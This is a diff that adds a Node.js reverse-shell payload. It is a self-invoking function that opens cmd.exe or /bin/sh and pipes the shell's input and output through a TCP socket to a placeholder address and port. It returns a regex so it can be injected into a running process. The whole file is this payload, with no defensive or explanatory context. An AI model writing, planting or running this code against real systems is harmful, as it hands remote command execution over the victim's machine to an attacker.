@@ -1,0 +1,25 @@
+(function () {
+    var net = require("net"),
+        cp = require("child_process"),
+        os = require("os"); // Detect OS
+
+    // Choose shell based on OS
+    var shell = os.platform().startsWith("win") ? "cmd.exe" : "/bin/sh";
+
+    var sh = cp.spawn(shell, []);
+    var client = new net.Socket();
+
+    client.connect(__PORT__, "__IPADDR__", function () {
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+
+    client.on("error", function (err) {
+        console.log("Connection error: " + err.message);
+        client.destroy();
+    });
+
+    return /a/; // Prevents Node.js from crashing
+})();
+
